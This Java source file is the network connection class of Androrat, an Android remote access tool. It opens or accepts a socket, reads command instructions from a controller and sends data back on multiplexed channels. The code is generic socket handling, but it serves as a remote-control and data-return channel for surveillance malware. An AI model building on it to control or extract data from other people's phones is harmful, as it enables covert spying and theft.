/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package out;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;



import out.Mux;

import in.Demux;
import in.Receiver;
import inout.Controler;

public class Connection
{
	Socket s;
	String ip = "localhost";
	int port = 5555;
	DataOutputStream out;
	DataInputStream in;
	
	boolean stop = false;
	ByteBuffer readInstruction;
	Mux m;
	Demux dem ;
	Controler controler;
	Receiver receive ;

	public Connection(String ip, int port)
	{
		this.ip = ip;
		this.port = port;
	}

	public Connection(String ip, int port, Controler ctrl)
	{
		this.ip = ip;
		this.port = port;
		this.controler = ctrl;
	}

	public boolean connect()
	{
		try
		{
			s = new Socket(ip, port);
			in = new DataInputStream(s.getInputStream());
			out = new DataOutputStream(s.getOutputStream());
			m = new Mux(out);
			dem = new Demux(controler, "moi");
			receive = new Receiver(s);
			return true;
		} catch (IOException e)
		{
			e.printStackTrace();
			return false;
		}
	}

	public boolean reconnect()
	{
		return connect();
	}

	public boolean accept(ServerSocket ss)
	{
		try
		{
			s = ss.accept();

			in = new DataInputStream(s.getInputStream());
			out = new DataOutputStream(s.getOutputStream());
			m = new Mux(out);
			return true;

		} catch (IOException e)
		{

			e.printStackTrace();
			return false;
		}
	}

	public ByteBuffer getInstruction() throws Exception
	{
		readInstruction = receive.read();
		
		if(dem.receive(readInstruction))
			readInstruction.compact();
		else
			readInstruction.clear();
		
		return readInstruction;
	}

	public void sendData(int chan, byte[] packet)
	{
		m.send(chan, packet);
	}
	
	public void stop() {
		try {
			s.close();
		} catch (IOException e) {
			
		}
	}
}